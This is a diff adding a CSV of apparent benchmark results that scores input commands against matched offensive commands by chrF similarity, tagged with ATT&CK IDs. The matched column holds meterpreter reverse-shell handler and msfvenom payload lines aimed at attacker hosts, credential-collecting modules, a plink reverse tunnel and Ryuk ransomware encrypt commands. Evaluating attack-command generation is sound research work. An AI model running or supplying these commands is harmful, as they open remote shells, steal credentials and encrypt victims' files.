@@ -1,0 +1,21 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",64.495,True
+command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",59.855,True
+command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",60.523,True
+command_metasploit_TA0042_T1587.txt,metasploit,use auxiliary/scanner/discovery/http_anonymizer,"```sh
+msf> use auxiliary/admin/smb/psexec_ntdsgrab
+```",31.083,True
+command_metasploit_TA0042_T1587.txt,metasploit,set payload windows/meterpreter/reverse_tcp,"```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",63.966,True
+command_metasploit_TA0042_T1587.txt,metasploit,set RHOSTS <attacker_ssh_user>@192.168.0.4,`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`,23.339,True
+command_metasploit_TA0042_T1587.txt,metasploit,store_loot store_file.txt -f <file_path>,`msf> loot -t screenspy.screenshot`,14.541,True
+command_metasploit_TA0042_T1587.txt,metasploit,run,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,12.449,True
+command_plink_TA0011_T1219.txt,plink,plink.exe -i <attacker_ssh_private_key> root@<target_machine_IP> -R 3389:localhost:3389,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",50.97,True
+command_ryuk_TA0002_T1204.txt,ryuk,ryuk.exe -e --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,34.525,True
+command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe /capture,`ryuk.exe --encrypt --process-name notepad.exe`,33.714,True
